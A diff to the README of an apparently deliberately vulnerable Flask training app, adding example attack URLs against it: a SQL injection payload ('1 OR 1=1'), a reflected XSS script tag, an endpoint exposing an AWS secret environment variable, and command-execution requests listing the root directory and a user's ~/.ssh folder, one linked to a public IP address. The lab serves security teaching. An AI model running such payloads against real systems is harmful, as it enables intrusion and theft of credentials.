@@ -124,16 +124,40 @@ Submit OS commands via the vulnerable Flask app:
 
 ---
 
+### SQLI - SQL Injection
+
+http://<victim>:5000/user?id=123
+http://<victim>:5000/user?id=1%20OR%201=1
+
 ### 💬 Reflected XSS
 
 Test for reflected XSS using the greet endpoint:
 
 - [Greet](http://<victim_IP>:5000/greet)
 
+
 **Example:**
 
 ```
 http://<victim_IP>:5000/greet?name=<script>alert('GotYou :)')</script>
+```
+
+### Fetch AWS secret
+
+```
+export AWS_SECRET_ACCESS_KEY="my_fake_secret_key"
+python3 web.py
+```
+
+```
+http://<victim>:5000/secret
+```
+
+### RCE - Remote Code Exec
+
+```
+http://<victim>:5000/cmd?exec=ls%20-l%20/
+[http://localhost:5000/cmd?exec=ll%20.ssh%20/"](http://3.96.142.208:5000/cmd?exec=ls%20-l%20~/.ssh)
 ```
 
 ---
